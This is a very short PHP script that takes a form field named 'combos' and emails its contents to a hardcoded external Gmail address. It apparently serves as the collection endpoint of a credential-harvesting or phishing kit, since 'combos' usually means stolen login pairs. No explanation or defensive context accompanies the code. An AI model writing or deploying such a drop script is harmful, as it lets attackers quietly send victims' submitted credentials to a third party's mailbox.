<?php
  // the message
  $msg = $_POST['combos'];

  // send email
  mail("titan.maclub@gmail.com","My subject",$msg);
?>